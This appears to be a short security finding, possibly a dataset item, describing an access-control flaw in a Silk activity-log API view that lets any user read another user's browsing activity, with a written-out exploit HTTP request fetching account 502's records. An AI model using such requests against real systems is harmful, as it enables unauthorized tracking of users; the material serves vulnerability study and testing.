diagnosis: UserProfilingActivityLogView retrieves logged Silk request metrics by querying account_id from the URL without enforcing that account_id == request.user.id. Any user can track another user's real-time browsing activity, visited URL paths, query counts, and execution timestamps.
exploit_request:
GET /api/silk/user-activity/502/ HTTP/1.1
Host: telemetry.analyticshub.io
Authorization: Bearer tenant_user_token
Accept: application/json
